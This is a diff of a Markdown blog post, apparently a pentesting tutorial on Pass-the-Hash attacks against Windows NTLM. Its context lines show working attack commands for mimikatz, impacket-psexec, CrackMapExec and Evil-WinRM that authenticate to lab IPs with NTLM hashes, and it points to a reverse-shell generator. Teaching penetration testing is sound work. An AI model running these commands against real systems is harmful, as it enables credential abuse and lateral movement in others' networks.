@@ -2,19 +2,10 @@
 
 title: "Pass the Hash (PtH) Attack: A Practical Guide"
 date: 2025-05-25 00:00:00 +0000
-tags:
-
-* pentesting
-* windows
-* mimikatz
-* impacket
-* red-teaming
-  categories:
-* security
-* red-teaming
-  pin: false
-
----
+categories: \[Security, Red Team]
+tags: \[pass-the-hash, NTLM, windows, pentesting, mimikatz, impacket, crackmapexec]
+pin: false
+----------
 
 A Pass the Hash (PtH) attack is a technique in which an attacker uses a password hash to authenticate to remote systems instead of the plaintext password. This method exploits authentication protocols like NTLM that accept hashed credentials without decrypting them. Since the hash remains valid until the user changes the password, it can be reused multiple times, making it a powerful attack vector.
 
@@ -26,7 +17,7 @@ To execute a PtH attack, the attacker typically needs elevated privileges on the
 
 * Dumping the Security Account Manager (SAM) database.
 * Extracting hashes from the NTDS.dit file on a Domain Controller.
-* Retrieving hashes from memory (e.g., `lsass.exe`).
+* Retrieving hashes from memory (e.g., lsass.exe).
 
 ---
 
@@ -50,6 +41,8 @@ mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06
 
 Reference: [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
 
+---
+
 ### 2. **Invoke-TheHash (Windows)**
 
 Invoke-TheHash is a PowerShell toolset for PtH attacks using SMB and WMI:
@@ -62,6 +55,8 @@ For a reverse shell, use: [https://www.revshells.com](https://www.revshells.com)
 
 Tool: [Invoke-TheHash GitHub](https://github.com/Kevin-Robertson/Invoke-TheHash)
 
+---
+
 ### 3. **Impacket PsExec (Linux)**
 
 Impacket provides various Python-based tools for network attacks:
@@ -71,6 +66,8 @@ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660
 ```
 
 Tool: [Impacket GitHub](https://github.com/fortra/impacket)
+
+---
 
 ### 4. **CrackMapExec (Linux)**
 
@@ -82,6 +79,8 @@ crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D06
 
 Documentation: [NetExec Wiki](https://netexec.readthedocs.io/en/latest/)
 
+---
+
 ### 5. **Evil-WinRM (Linux)**
 
 Evil-WinRM allows PowerShell Remoting with hashes:
@@ -91,6 +90,8 @@ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF345
 ```
 
 Tool: [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
+
+---
 
 ### 6. **Using xfreerdp for RDP (Linux)**
 
